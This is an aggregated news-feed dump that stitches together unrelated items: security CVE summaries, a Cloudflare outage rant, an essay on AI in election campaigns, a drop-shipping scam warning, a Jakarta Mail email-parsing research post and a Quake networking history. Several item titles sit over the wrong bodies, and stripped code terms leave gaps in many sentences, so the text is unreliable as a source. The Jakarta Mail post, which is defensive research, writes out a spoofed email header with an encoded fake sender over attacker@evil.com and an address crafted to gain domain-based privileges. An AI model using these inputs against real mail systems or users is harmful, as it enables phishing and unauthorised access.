+0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed details of a cyber attack targeting a major U.S.-based real-estate company that involved the use of a nascent command-and-control (C2) and red teaming framework known as Tuoni.

I'm trying to browse the web, but about half of the sites show an error:Most of these sites are not even that big.
I expect maybe a few thousand visitors per month.This demonstrates again a simple fact: if you put your site behind a centralized service, then this service is a single point of failure.
Even large established companies make mistakes and can go down.Most people use Cloudflare because they have been scared into the idea that you need DDoS protection.
Well, maybe you do, but probably you don't.As they say in security, "no one will burn a zero day on you!".
For your small blog with one hundred visitors per month, it's probably the same:
"no one will burn their DDoS capabilities on you!"I don't know how else to say it.
Many people keep talking about the importance of a decentralized web, and then continue putting their site behind Cloudflare.If you really want to be safe in case your server goes down, then setup a second version of your site at another location and point to that server via the A and AAAA records, see "round-robin DNS".Maybe that's the core of this message.
Face your fears.
Put your service on the internet.
Maybe it goes down, but at least not by yet another Cloudflare outage.]]></content:encoded></item><item><title>Iranian Hackers Use DEEPROOT and TWOSTROKE Malware in Aerospace and Defense Attacks</title><link>https://thehackernews.com/2025/11/iranian-hackers-use-deeproot-and.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgANn6HS89nO5bbMqMw7uLG3adyrOqaceztN7_QFT7PAalBP3sITkB3y9z_36naCvTv5YRhgusQx6tXEB9nSmQAru_0EV5LNLyj2FWdZwcD55V4ODt_EJtB4KOipfALbQ_U1pklNh50PFR8P4A_G6D6E3ua0sTbk-JIn0ZF5RTFkY51dw5IyzsI7IJGcl3h/s1600/Aerospace-hackers.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 12:54:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Suspected espionage-driven threat actors from Iran have been observed deploying backdoors like TWOSTROKE and DEEPROOT as part of continued attacks aimed at aerospace, aviation, and defense industries in the Middle East.

 Nov. 18, 2025, 12:15 p.m. | 1 day, 4 hours ago
A Cross-Site Request Forgery (CSRF) vulnerability exists in multiple WSO2 products due to the use of the HTTP GET method for state-changing operations within admin services, specifically in the event processor of the Carbon console. Although the SameSite=Lax cookie attribute is used as a mitigation, it is ineffective in this context because it allows cookies to be sent with cross-origin top-level navigations using GET requests.

A malicious actor can exploit this vulnerability by tricking an authenticated user into visiting a crafted link, leading the browser to issue unintended state-changing requests. Successful exploitation could result in unauthorized operations such as data modification, account changes, or other administrative actions. According to WSO2 Secure Production Guidelines, exposure of Carbon console services to untrusted networks is discouraged, which may reduce the impact in properly secured deployments.

 Nov. 18, 2025, 3:16 p.m. | 1 day, 1 hour ago
A missing authentication enforcement vulnerability exists in the mutual TLS (mTLS) implementation used by System REST APIs and SOAP services in multiple WSO2 products. Due to improper validation of client certificate–based authentication in certain default configurations, the affected components may permit unauthenticated requests even when mTLS is enabled. This condition occurs when relying on the default mTLS settings for System REST APIs or when the mTLS authenticator is enabled for SOAP services, causing these interfaces to accept requests without enforcing additional authentication.

Successful exploitation allows a malicious actor with network access to the affected endpoints to gain administrative privileges and perform unauthorized operations. The vulnerability is exploitable only when the impacted mTLS flows are enabled and accessible in a given deployment. Other certificate-based authentication mechanisms such as Mutual TLS OAuth client authentication and X.509 login flows are not affected, and APIs served through the API Gateway of WSO2 API Manager remain unaffected.

It can be easy to forget it was not always that way.In 2008, social media was just emerging into the mainstream. Facebook reached 100 million users that summer. And a singular candidate was integrating social media into his political campaign: Barack Obama. His campaign’s use of social media was so bracingly innovative, so impactful, that it was viewed by journalist David Talbot and others as the strategy that enabled the first term Senator to win the White House.Over the past few years, a new technology has become mainstream: AI. But still, no candidate has unlocked AI’s potential to revolutionize political campaigns. Americans have three more years to wait before casting their ballots in another Presidential election, but we can look at the 2026 midterms and examples from around the globe for signs of how that breakthrough might occur.Rereading the contemporaneous reflections of the  late media critic, David Carr, on Obama’s campaign reminds us of just how new social media felt in 2008. Carr positions it within a now-familiar lineage of revolutionary communications technologies from newspapers to radio to television to the internet.The Obama campaign and administration demonstrated that social media was different from those earlier communications technologies, including the pre-social internet. Yes, increasing numbers of voters were getting their news from the internet, and content about the then-Senator sometimes made a splash by going viral. But those were still broadcast communications: one voice reaching many. Obama found ways to connect voters to each other.In describing what social media revolutionized in campaigning, Carr quotes campaign vendor Blue State Digital’s Thomas Gensemer: “People will continue to expect a conversation, a two-way relationship that is a give and take.”The Obama team made some earnest efforts to realize this vision. His transition team launched change.gov, the website where the campaign collected a “Citizen’s Briefing Book” of public comment. Later, his administration built We the People, an online petitioning platform.But the lasting legacy of Obama’s 2008 campaign, as political scientists Hahrie Han and Elizabeth McKenna chronicled, was pioneering online “relational organizing.” This technique enlisted individuals as organizers to activate their friends in a self-perpetuating web of relationships.Perhaps because of the Obama campaign’s close association with the method, relational organizing has been touted repeatedly as the linchpin of Democratic campaigns: in 2020, 2024, and today. But research by non-partisan groups like Turnout Nation and right-aligned groups like the Center for Campaign Innovation has also empirically validated the effectiveness of the technique for inspiring voter turnout within connected groups.The Facebook of 2008 worked well for relational organizing. It gave users tools to connect and promote ideas to the people they know: college classmates, neighbors, friends from work or church. But the nature of social networking has changed since then.For the past decade, according to Pew Research, Facebook use has stalled and lagged behind YouTube, while Reddit and TikTok have surged. These platforms are less useful for relational organizing, at least in the traditional sense. YouTube is organized more like broadcast television, where content creators produce content disseminated on their own channels in a largely one-way communication to their fans. Reddit gathers users worldwide in forums (subreddits) organized primarily on topical interest. The endless feed of TikTok’s “For You” page disseminates engaging content with little ideological or social commonality. None of these platforms shares the essential feature of Facebook c. 2008: an organizational structure that emphasizes direct connection to people that users have direct social influence over.AI and Relational OrganizingIdeas and messages might spread virally through modern social channels, but they are not where you convince your friends to show up at a campaign rally. Today’s platforms are spaces for political hobbyism, where you express your political feelings and see others express theirs.Relational organizing works when one person’s action inspires others to do this same. That’s inherently a chain of human-to-human connection. If my AI assistant inspires your AI assistant, no human notices and one’s vote changes. But key steps in the human chain can be assisted by AI. Tell your phone’s AI assistant to craft a personal message to one friend—or a hundred—and it can do it.So if a campaign hits you at the right time with the right message, they might persuade you to task your AI assistant to ask your friends to donate or volunteer. The result can be something more than a form letter; it could be automatically drafted based on the entirety of your email or text correspondence with that friend. It could include references to your discussions of recent events, or past campaigns, or shared personal experiences. It could sound as authentic as if you’d written it from the heart, but scaled to everyone in your address book.Research suggests that AI can generate and perform written political messaging about as well as humans. AI will surely play a tactical role in the 2026 midterm campaigns, and some candidates may even use it for relational organizing in this way.(Artificial) Identity PoliticsFor AI to be truly transformative of politics, it must change the way campaigns work. And we are starting to see that in the US.The earliest uses of AI in American political campaigns are, to be polite, uninspiring. Candidates viewed them as just another tool to optimize an endless stream of email and text message appeals, to ramp up political vitriol, to harvest data on voters and donors, or merely as a stunt.Of course, we have seen the rampant production and spread of AI-powered deepfakes and misinformation. This is already impacting the key 2026 Senate races, which are likely to attract hundreds of millions of dollars in financing. Roy Cooper, Democratic candidate for US Senate from North Carolina, and Abdul El-Sayed, Democratic candidate for Senate from Michigan, were both targeted by viral deepfake attacks in recent months. This may reflect a growing trend in Donald Trump’s Republican party in the use of AI-generated imagery to build up GOP candidates and assail the opposition.And yet, in the global elections of 2024, AI was used more memetically than deceptively. So far, conservative and far right parties seem to have adopted this most aggressively. The ongoing rise of Germany’s far-right populist AfD party has been credited to its use of AI to generate nostalgic and evocative (and, to many, offensive) campaign images, videos, and music and, seemingly as a result, they have dominated TikTok. Because most social platforms’ algorithms are tuned to reward media that generates an emotional response, this counts as a double use of AI: to generate content and to manipulate its distribution.AI can also be used to generate politically useful, though artificial, identities. These identities can fulfill different roles than humans in campaigning and governance because they have differentiated traits. They can’t be imprisoned for speaking out against the state, can be positioned (legitimately or not) as unsusceptible to bribery, and can be forced to show up when humans will not.In Venezuela, journalists have turned to AI avatars—artificial newsreaders—to report anonymously on issues that would otherwise elicit government retaliation. Albania recently “appointed” an AI to a ministerial post responsible for procurement, claiming that it would be less vulnerable to bribery than a human. In Virginia, both in 2024 and again this year, candidates have used AI avatars as artificial stand-ins for opponents that refused to debate them.And yet, none of these examples, whether positive or negative, pursue the promise of the Obama campaign: to make voter engagement a “two-way conversation” on a massive scale.The closest so far to fulfilling that vision anywhere in the world may be Japan’s new political party, Team Mirai. It started in 2024, when an independent Tokyo gubernatorial candidate, Anno Takahiro, used an AI avatar on YouTube to respond to 8,600 constituent questions over a seventeen-day continuous livestream. He collated hundreds of comments on his campaign manifesto into a revised policy platform. While he didn’t win his race, he shot up to a fifth place finish among a record 56 candidates.Anno was RECENTLY elected to the upper house of the federal legislature as the founder of a new party with a 100 day plan to bring his vision of a “public listening AI” to the whole country. In the early stages of that plan, they’ve invested their share of Japan’s 32 billion yen in party grants—public subsidies for political parties—to hire engineers building digital civic infrastructure for Japan. They’ve already created platforms to provide transparency for party expenditures, and to use AI to make legislation in the Diet easy, and are meeting with engineers from US-based Jigsaw Labs (a Google company) to learn from international examples of how AI can be used to power participatory democracy.Team Mirai has yet to prove that it can get a second member elected to the Japanese Diet, let alone to win substantial power, but they’re innovating and demonstrating new ways of using AI to give people a way to participate in politics that we believe is likely to spread.AI could be used in the US in similar ways. Following American federalism’s longstanding model of “laboratories of democracy,” we expect the most aggressive campaign innovation to happen at the state and local level.D.C. Mayor Muriel Bowser is partnering with MIT and Stanford labs to use the AI-based tool deliberation.io to capture wide scale public feedback in city policymaking about AI. Her administration said that using AI in this process allows “the District to better solicit public input to ensure a broad range of perspectives, identify common ground, and cultivate solutions that align with the public interest.”It remains to be seen how central this will become to Bowser’s expected re-election campaign in 2026, but the technology has legitimate potential to be a prominent part of a broader program to rebuild trust in government. This is a trail blazed by Taiwan a decade ago. The vTaiwan initiative showed how digital tools like Pol.is, which uses machine learning to make sense of real time constituent feedback, can scale participation in democratic processes and radically improve trust in government. Similar AI listening processes have been used in Kentucky, France, and Germany.Even if campaigns like Bowser’s don’t adopt this kind of AI-facilitated listening and dialog, expect it to be an increasingly prominent part of American public debate. Through a partnership with Jigsaw, Scott Rasmussen’s Napolitan Institute will use AI to elicit and synthesize the views of at least five Americans from every Congressional district in a project called “We the People.” Timed to coincide with the country’s 250th anniversary in 2026, expect the results to be promoted during the heat of the midterm campaign and to stoke interest in this kind of AI-assisted political sensemaking.In the year where we celebrate the American republic’s semiquincentennial and continue a decade-long debate about whether or not Donald Trump and the Republican party remade in his image is fighting for the interests of the working class, representation will be on the ballot in 2026. Midterm election candidates will look for any way they can get an edge. For all the risks it poses to democracy, AI presents a real opportunity, too, for politicians to engage voters en masse while factoring their input into their platform and message. Technology isn’t going to turn an uninspiring candidate into Barack Obama, but it gives any aspirant to office the capability to try to realize the promise that swept him into office.This essay was written with Nathan E.

A few clicks can get almost anything delivered straight to your door, sometimes at a surprisingly low price. But behind some of those deals lies a fulfillment model called drop-shipping. It’s not inherently fraudulent, but it can leave you disappointed, stranded without support, or tangled in legal and safety issues.I’m in the process of de-Googling myself, so I’m looking to replace my Fitbit. Since Google bought Fitbit, it’s become more difficult to keep your information from them—but that’s a story for another day.Of course, Facebook picked up on my searches for replacements and started showing me ads for smartwatches. Some featured amazing specs at very reasonable prices. But I had never heard of the brands, so I did some research and quickly fell into the world of drop-shipping.What is drop-shipping, and why is it risky?Drop-shipping means the seller never actually handles the stock they advertise. Instead, they pass your order to another company—often an overseas manufacturer or marketplace vendor—and the product is then shipped directly to you. On the surface, this sounds efficient: less overhead for sellers and more choices for buyers. In reality, the lack of oversight between you and the actual supplier can create serious problems.One of the biggest concerns is quality control, or the lack of it. Because drop-shippers rely on third parties they may never have met, product descriptions and images can differ wildly from what’s delivered. You might expect a branded electronic device and receive a near-identical counterfeit with dubious safety certifications. With chargers, batteries, and children’s toys, poor quality control isn’t just disappointing, it can be downright dangerous. Goods may not meet local standards and safety protocols, and contain unhealthy amounts of chemicals.Buyers might unknowingly receive goods that lack market approval or conformity marks such as CE (Conformité Européenne = European Conformity), the UL (Underwriters Laboratories) mark, or FCC certification for electronic devices. Customs authorities can and do seize noncompliant imports, resulting in long delays or outright confiscation. Some buyers report being asked to provide import documentation for items they assumed were domestic purchases.Then there’s the issue of consumer rights. Enforcing warranties or returns gets tricky when the product never passed through the seller’s claimed country of origin. Even on platforms like Amazon or eBay that offer buyer protection, resolving disputes can take a while to resolve.Drop-shipping also raises data privacy concerns. Third-party sellers in other jurisdictions might receive your personal address and phone number directly. With little enforcement across borders, this data could be reused or leaked into marketing lists. In some cases, multiple resellers have access to the same dataset, amplifying the risk.In the case of the watches, other users said they were pushed to install Chinese-made apps with different names than the brand of the watch.. We’ve talked before about the risks that come with installing unknown apps.A few quick checks can spare you a lot of trouble.Research unfamiliar sellers, especially if the price looks too good to be true.Check where the goods ship from before placing an order.Use payment methods with strong buyer protection.Stick with platforms that verify sellers and offer clear refund policies. for unexpected shipping fees, extra charges, or requests for more personal information after you buy.Drop-shipping can be legitimate when done well, but when it isn’t, it shifts nearly all risk to the buyer. And when counterfeits, privacy issues and surprise fees intersect, the “deal” is your data, your safety, or your patience.If you’re unsure about an ad, you can always submit it to Malwarebytes Scam Guard. It’ll help you figure out whether the offer is safe to pursue.And when buying any kind of smart device that needs you to download an app, it’s worth remembering these actions:Question the permissions an app asks for. Does it serve a purpose for you, the user, or is it just some vendor being nosy?Read the privacy policy—yes, really. Sometimes they’re surprisingly revealing.Don’t hand over personal data manufacturers don’t need. What’s in it for you, and what’s the price you’re going to pay? They may need your name for the warranty, but your gender, age, and (most of the time) your address isn’t needed.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products.

Upon looking closer at the constructors (there were multiple), I realised that their behaviours were not consistent.This inconsistent parsing could lead to high risk vulnerabilities depending on how an application is using email addresses.
For example, an application may grant privileged access if the supplied email is from a particular domain.
What happens if an attacker registers and verifies their email address that belongs to their own domain, but somehow satisfies the aforementioned criteria?In this blog, we will be looking at interesting “features” this library has to offer. We will also examine how Hibernate’s  annotation behaves when performing email address validation.At the end of this post, there is a handy checklist that should be helpful when auditing an application that uses Jakarta Mail. We have also created custom Semgrep rules to help you identify these primitives.When I dived into Jakarta Mail, I remembered that Gareth Heyes from PortSwigger published an extensive write-up about email parsing, so I wanted to extend his research.
Part of the write-up mentioned how encoded strings can be used to “split” email address parsing.There is also a write-up by Nathan Davison about email parsing differential that he found with AWS SES.
This behaviour was also observed in Jakarta Mail due to the way parsing was done to ensure RFC-compliance.
We will be looking at it in detail in this post, but the gist is that if a supplied email address looks like , the actual email will be sent to  in accordance with RFC 822.Finally, Elliot Alderson also has an interesting write-up about how an “overloaded” email address passed the application’s flawed checks.
For example, it naively checks that the email address ends with  but when an email address like tester@protonmail.com@presidence@elysee.fr is supplied, the actual emails are sent to .Background on Jakarta MailJakarta Mail is part of the Jakarta EE platform, which is a set of API specifications for frameworks looking to be Jakarta EE-compliant.
As of Jakarta Mail version , Angus Mail by the Eclipse Foundation is a compliant framework.
Its specification page can be found here.Note that even though Jakarta Mail is intended to be a set of specifications, it comes with default implementations of Classes such as , , , etc. and these default classes are what we will be looking at.In the  class, it is stated that email address validation complies with RFC 822 and that the “Personal Name” field complies with RFC 2047 (encoded strings).Encoded Strings (RFC 2047)What are these? The TL;DR is that encoded strings are a way to represent and transport non-ASCII characters by encoding them.
The write-up by Gareth goes into great detail and does an excellent job in explaining what encoded strings are.Simply put, an encoded string has the following syntax:=?charset?encoding?encoded-text?=
 are start and end anchors, and  act as delimiters indicates the character set of the encoded text (e.g. UTF-8) is either  (base-64) or  (quoted) to indicate the encoding type being the text encoded by the chosen encodingThe following is an example of an email address containing an encoded string:=?utf-8?q?hello=77=6f=72=6c=64?=@example.com
 – start/end markers –  (helloworld)It will be resolved to  by email parsers.InternetAddress Primitives is shipped with the Jakarta Mail library and thus most Java applications that work with email addresses will most likely import this library.I’ve noted that there were multiple constructors for the  class intended for different scenarios, and here is the one for the single string argument constructor.Nothing unusual with the code here.
It seems like the intention is to take in an email address string and call the  method, which validates the email address for RFC 822 compliance.
Afterwards, the email address and personal name will be assigned to the object itself.What about the 2-argument and 3-argument constructors?Astute readers will immediately notice the issue here - the input  is directly assigned to the object itself without calling the  method to parse it!This was indeed the case from testing:This means that if an application uses any of these constructors and assumes that the email address will be validated for RFC-compliance, they are sorely mistaken! 🙈Email Address Parsing DifferentialSpeaking of validating an email for RFC-compliance, where do you think an email sent to the following address will end up at?If you want to be compliant with RFC-822 (and its successors), you will send the email to :Received Email: <aaa@bbb.com>ccc@ddd.com

=====

getAddress(): aaa@bbb.com
getPersonal(): null
toString(): aaa@bbb.com
However, developers may think that the email address is  or .
This differential is what leads us to high impact vulnerabilities!Imagine the following scenario: there’s an application that identifies users via their email address.
It also grants special privileges to accounts originating from the  domain.
If the registration is not restrictive enough, we could register with an email address similar to the earlier example (<attacker@example.com>@foo.com).
Let’s also assume that when granting special privileges, the application does a simple match with  to look for the  domain.
It also trusts that the  constructor ensures that the input is a valid email string.But what is a valid email string?The  certainly thinks <attacker@example.com>@foo.com is valid and will happily send the verification email to .
Meanwhile, the application identifies the user as <attacker@example.com>@foo.com, sees that it is from  and grants it special privileges!The InternetAddress.getGroup() method returns an array of  from its current group address.
So what is a group address?It is basically a string with the following syntax:group-name:[addr1, addr2 …];
Where a group name is supplied, followed by a colon.
Then, 0 or more email addresses are included with commas used as delimiters.
The entire sequence is then terminated with a semicolon.Parsing a group address typically looks like:Received Email: a:ccc@ddd.com,eee@fff.com,ggg@hhh.com;
Size of Addresses: 3

=====

getAddress(): ccc@ddd.com
getPersonal(): null
toString(): ccc@ddd.com

=====

getAddress(): eee@fff.com
getPersonal(): null
toString(): eee@fff.com

=====

getAddress(): ggg@hhh.com
getPersonal(): null
toString(): ggg@hhh.com
A group address will be parsed successfully through the  method and could potentially lead to more differential issues or even ReDoS, depending on how the application uses the input string that gets passed to . is also a default class shipped with Jakarta Mail.
It is used to represent the message envelope, which includes the email headers and body.What’s interesting here is that when parsing certain email headers such as ,  and ,  will call InternetAddress.parseHeader() to process the input.
Within InternetAddress.parseHeader(), it calls .
This means that primitives applicable to  are also accessible through .
For example, when parsing complex email addresses like  or email addresses with encoded strings.To do this,  has constructors that take in an email envelope as input and parses its headers.
If you happen to come across applications calling any of the following MimeMessage constructors with user-supplied email envelopes, be sure to take a closer look at how it uses the input from these headers:A potential abuse scenario would be if an email application does not show the raw encoded string in their user interface and displays the Personal Name section first.
This could lead to phishing emails appearing legitimate.
Take the following email envelope for example:From: =?UTF-8?Q?Administrator_=3Cadmin@example.com=3E?= <attacker@evil.com>
To: victim@example.com
Subject: =?UTF-8?Q?Administrator_=3Cadmin@example.com=3E?=
Content-Type: text/plain; charset=UTF-8

Your account needs verification.
The  constructor will parse the envelope above and when the  and  methods are called, the decoded strings will be shown:getSubject(): Administrator <admin@example.com>
getPersonal(): Administrator <admin@example.com>
If the email application happens to display the sender’s email as Personal Name <Email Address>, the Personal Name section can be crafted like the above example and to trick end-users into thinking that it is from a legitimate sender.
Of course, this is just an example to demonstrate the importance of verifying how applications utilises  and its methods.The MimeMessage.getRecipients() method retrieves a specified header value from the email envelope.
This header can be either , ,  or .
In the latter’s case, the  method will be invoked to retrieve the values from the  header.
This method also concatenates values from duplicate headers with a comma delimiter.In the  method, it basically splits the input string by commas and inserts them into an arraylist of  objects:At [1], an interesting behaviour can be found in the  constructor, which is shown below:A malformed input would not throw any exceptions and would silently be assigned anyway.
Even the comments says that an exception should be thrown 🤔Spring Framework ()The root-level package for Spring Framework’s email support.
The classes found in this package all utilise Jakarta Mail in one way or another.This class is used to prepare a  object using a supplied email address string:Looking at [1], it simply passes the input string to the  constructor (only the 1-argument constructor, unfortunately).
This means that the Personal Name field will be decoded if it is an encoded string.
Again, a potential misuse of this behaviour would be phishing attacks.
If an application shows the Personal Name section of an email address, we can make it look like the email came from a legitimate sender.InternetAddressEditor editor = new InternetAddressEditor();
editor.setAsText("=?UTF-8?Q?Administrator_=3Cadmin@example.com=3E?= <attacker@evil.com>");
InternetAddress address = (InternetAddress) editor.getValue();

address.getPersonal(); // Administrator <admin@example.com>
address.getAddress(); // attacker@evil.com
This is a library that introduces the  annotation to verify that the string follows a valid email format.
As we now know that “valid email format” can potentially mean complex looking email addresses, we should go ahead and verify what constitutes a “valid email” in the eyes of Hibernate.Developers can specify custom regex patterns (via ), or use the default pattern.
What I’ve found was that the default pattern is very restrictive and is  RFC 2047 compliant (no encoded strings 🙁).When validation is triggered via the  annotation, the EmailValidator class is used to perform the checks.
It then calls its parent class  to validate the email string, which also uses DomainNameUtil to perform domain name validation.In the default regex, validation is split into two sections: local and domain, where the former is everything before the  while the latter is everything after.
It gets really intense as seen below:With a bit of experimentation, I found that the email address "foo@bar.com@"@example.com will pass the default regex validation.
This means that if an application naively checks the domain of an email address with , it will pull the incorrect domain.If you have made it this far, I hope you have learnt something new and/or have some research ideas on your own about email parsers. Note that the ideas we have explored are not limited to Jakarta Mail but can be extended to any application that uses email addresses to establish identities. As long as developers are not fully aware of how the libraries they are using are parsing email addresses, there will always be the possibility of email parsing differentials.The next time you encounter Jakarta Mail or any libraries that uses it, be sure to take a closer look to see if the application makes any assumptions about how emails are parsed by this library. If only there are some Semgrep rules to help you out… oh wait - here it is!This blog post is based on the talks that I gave in BSides Canberra and BSides Perth 2025. You can find the slide deck here.Checklist for Jakarta MailA list of primitives to look out for.]]></content:encoded></item><item><title>CVE-2025-41346 - Stored Cross-Site Scripting (XSS) in WinPlus by Informática del Este</title><link>https://cvefeed.io/vuln/detail/CVE-2025-41346</link><author></author><category>vulns</category><pubDate>Tue, 18 Nov 2025 10:04:11 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-41346

The Pie Forms for WP plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 1.6 via the format_classic function. This is due to insufficient file type validation where the validate_classic method validates file extensions and sets error messages but does not prevent the file upload process from continuing. This makes it possible for unauthenticated attackers to upload files with dangerous extensions such as PHP, which makes remote code execution possible. In order to exploit this vulnerability, the attacker needs to guess the directory in which the file is placed (which is a somewhat predictable hash). In addition to that, the file name is generated using a secure hash method, limiting the exploitability of this vulnerability.

Besides the emergence of 3D hardware accelerator cards and the growth of the Internet, an operating system shift put game developers in a tough position.With its push for Windows 95 and Windows NT, Microsoft was replacing its legacy PC operating system, MS-DOS. From 1996 to 1997, the market share of DOS dropped by 50%. Some developers, like Blizzard North, took the leap of faith and wrote Windows 95–exclusive titles such as Diablo. id Software on the other hand went through the effort of producing a single binary, , able to run on both DOS and Windows.What is even more impressive is that id managed to make  better when Windows 95 TCP/IP stack was available. Here is how they did it. is a DOS executable. id Software had used  compiler for DOOM but they switched to a GCC port named  to cross-compile  on Alpha servers. file quake.exe  
quake.exe: MS-DOS executable, COFF for MS-DOS, DJGPP go32 DOS extender
Alike 's ,  offered to developers an extender allowing to write programs with flat 32-bit addressing instead of the dreaded 16-bit near/far hellish real-mode otherwise mandated by DOS. An extender works with a client and a server. In the case of  the extender client is embedded in  while the server is in .From the beginning of the development, id had requested from  engineers that their DPMI client would be able to run on 's DPMI server but also Windows 95 DPMI server.It may not be apparent how much of a tour-de-force it was for  to make their DPMI client work with another DPMI server but knowing a little about how it works, it blows me away. Raymond Chen, Microsoft kernel engineer at the time, had the best description of how to perceive this situation.
    The client application was written with the assumption that it is using the MS-DOS extender that is included with the application, but in reality it is talking to the DPMI host that comes with Windows.
     The fact that programs seem to run mostly okay in spite of running under a foreign extender is either completely astonishing or totally obvious, depending on your point of view.
      It’s completely astonishing because, well, you’re taking a program written to be run in one environment, and running it in a different environment. Or it’s totally obvious because they are using the same DPMI interface, and as long as the interface has the same behavior, then naturally the program will continue to work, because that’s why we have interfaces!Being able to run with Windows 95 DPMI server was how  pulled off the ability to run under both DOS and Windows 95.DOOM only needed two files to run,  and  but there are many files that came with Quake.$ find quake
./mgenvxd.vxd   ./genvxd.dll ./qlaunch.exe     ./id1/pak0.pak   ./pdipx.com
./cwsdpmi.exe   ./q95.bat    ./id1/config.cfg  ./quake.exe      ./quakeudp.dll 
It looks like a mess at first sight but running Quake under DOS only requires four files. Namely, the game engine , the config file , the asset file , and the DOS extender server .quake.exe under DOS: Multiplayer Quake supported four types of multiplayer protocols.Two modes allowed gamers to enter a duel (1v1). Both modes expected a device plugged into the COM port of the PC. A modem allowed to call an opponent's phone number (hello $$$) while a NullModem cable (called here "Direct Connect") required both computers to be a few feet apart.Both IPX and TCP/IP allowed a much more interesting deathmatch featuring up to 16 players. IPX technology was intended for LAN where all machines were a few feet apart, while TCP/IP allowed to reach anybody worldwide.Notice how, under DOS, by default, both IPX and TCP modes were disabled (greyed out).quake.exe under DOS: Greyed out Multiplayer modes Quake came with  which loaded an IPX DOS TSR. That TSR communicated with a packet driver which in turn hit the network card. Quake was able to probe for that DOS TSR and upon detection allowed players to select IPX.Using TCP/IP was nearly impossible. DOS did not come with a TCP/IP stack and it was something complex enough that only a single vendor provided a TSR for it on DOS.
 The TSR name was BWNFS. Made by , its cost $395 in 1996 ($830 in 2025!). It is reasonable to say that few gamers ever used TCP/IP on DOS to play QUAKE.quake.exe under Windows 95Starting  from Windows 95 works like a charm. The executable is loaded into a Windows 95 "dos-box" that virtualizes memory, interrupts, and signals. The game ran exactly like under DOS with the same multiplayer choices available. It was convenient since users did not have to load any mouse driver or set up the  environment variable to make the sound card work. Much less convenient however, this way to run Quake requires 16 MiB RAM. Quake only needs 8 MiB but Windows 95 adds quite a bit of overhead! The same files used when running from DOS are used here as well, except for , since the DJGPP client detects and uses Windows’ built-in DPMI server.It is impressive to see  run at full speed knowing that Windows 95 runs DOS executable in a virtual machine. My guess is that, in full screen, memory writes and reads to the VGA are given direct access to the hardware to preserve performances.The magical q95.bat scriptStarting  from DOS or Windows are not the only two options to run . There is a third one which is to launch .In this case, a window "Launching Quake" briefly pops up on Windows 95 desktop. The text gives a clue about what is happening. Quake is loaded with a tunnel to Winsock, Microsoft's TCP/IP stack. There is further indication of  is doing that, "Powered by Mpath". But not much more to explain  this all works.Mpath Interactive was a company dedicated to online gaming. They provided subscription services to help gamers find each other but also operated as an ISP reseller.. It was in their interest to help gaming companies to release titles allowing Internet play as Larry Hastings, an Mpath employee at the time, recalls.
Back then in the primordial ooze that was the mid-90s internet, online multiplayer was still in its infancy.  If you wanted to play a multiplayer game on the internet, either you needed to have explicit host & port information, or you needed to use an online multiplayer gaming service.  And in 1995 there were only two: us, and Total Entertainment Network. You might think game creators would come to us and say "please put my game on your service!", but... nope!  Not only did we have a licensing team that went out and got contracts to license games for our service, but we had to pay the vendor for the right to license their game, which was often an exclusive. So, we had Quake and Unreal; TEN got Duke Nukem 3D and NASCAR.
The user experience for Mplayer was like this.  First, you'd run the "Gizmo", which was a Windows program that acted as a sort of game browser.  It knew which compatible games you had installed, and it'd let you browse the multiplayer games on offer for each game; the metaphor we used for this was a "room".  Quake was drop-in, so you could simply find a game in progress and hop right in--not a feature of very many games back then.  Alternatively, you could find a "room" where someone was proposing to launch a game soon.  Or you could create your own.  You'd set the name of the room, and the Mplayer Gizmo had some per-game UI that let you set the settings for the game (what map, what features, etc).  The room featured text and audio chat, and even a shared "whiteboard", a simple paint program.  Once the owner of the "room" "launched" the game, everyone's Gizmos would automatically start the game for them, and the game would automatically join that online game and start playing.
In order for a game to run on Mplayer, it had to integrate with the Mplayer software stack. Mostly this integration work was done by Mpath engineers; we'd get source code from the game developer and "porting engineers" would get it to run on Mplayer.  This often included modifying both the client and the server, so that both could talk via Mplayer's servers.
The early version of Quake was DOS only, and used the Chunnel to talk to the Windows 95 TCP/IP stack.  (Which in retrospect makes the "Chunnel" a type of "thunk", like Microsoft's "Win32s".)  I think the deal was, we licensed the Chunnel to id, and in return for that we got to have Quake on Mplayer.  So, DOS Quake supported running on Mplayer via the Chunnel, in addition to connecting to open game servers on the Internet via host and port.- Larry Hastings (Email conversation)Larry was kind enough to share some Quake anecdotes.
One afternoon shortly after we got our first build of the game, we played a round of deathmatch with the id team over the internet.  We were in Cupertino, CA, in a building on Bandley Drive (now a "Fitness Center" for Apple employees).  They of course were in Mesquite TX.  Yup, it was deathmatch over the internet--very exciting!  The only id employee I remember for sure being in the game was Tim Willits.  He owned us, both because he was way more used to Quake, but also because he knew where all the secrets were.  At one point I spotted him coming out of a secret doorway with a rocket launcher.  And either he didn't see me, or I died shortly thereafter.- Larry Hastings (Email conversation)As for explaining how the Chunnel worked, I was out of luck.
I didn't work on the Chunnel.  That was mainly a British guy named Henry but I don't remember his last name, it was thirty years ago.  All I  remember about him is what he looked like, and the fact that he drove a cool car, a white Merkur XR4Ti.- Larry Hastings (Email conversation)When everything else fails, we still have Ghidra and doomworld's amazing community (thanks xttl). After much decompiling and talking, it turned out all files previously ignored were part of Mpath's "Chunnel". is just a small script to launch mpath's main program.  contains all the MPlayer functions. However the role of this executable is limited.It merely loads . Despite its confusing name, this DLL is the heart of Quake Chunnel. It is the bridge to Microsoft TCP/UDP/IP stack (). It also starts Quake with  parameter to make it load a BSD network socket API . Finally, it also loads the virtual device driver manager .The virtual device is the trick that allows a DOS executable running inside a Windows 95 dos box to communicate with win32. The  dynamic library loads a virtual device driver named  which installs itself to respond on interrupt .The last piece of the puzzle is on Quake side. The implementation of BSD , , is code provided by Mpath.

